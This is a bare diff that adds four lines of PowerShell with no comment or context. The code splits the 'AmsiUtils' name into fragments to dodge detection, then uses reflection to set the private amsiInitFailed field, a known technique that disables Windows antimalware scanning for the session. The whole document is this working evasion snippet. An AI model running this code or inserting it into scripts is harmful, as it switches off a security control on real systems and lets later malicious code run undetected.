@@ -1,0 +1,4 @@
+$a = "si"; $b = "Am"; $c = "Utils"
+$t = [Ref].Assembly.GetType("System.Management.Automation." + $b + $a + $c)
+$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
+$f.SetValue($null, $true)
